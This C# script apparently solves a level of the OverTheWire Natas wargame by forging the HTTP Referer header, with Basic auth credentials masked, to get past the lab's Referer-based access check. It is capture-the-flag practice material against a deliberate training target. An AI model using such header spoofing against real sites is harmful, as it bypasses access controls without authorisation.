using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas4.natas.labs.overthewire.org");
string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas4:???????????????????????????????????????"));

HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
request.Headers.Add("Authorization", "Basic " + credential);

request.Headers.Add("Referer", "http://natas5.natas.labs.overthewire.org");

HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = await httpResponse.Content.ReadAsStringAsync();
Console.WriteLine(body) ;
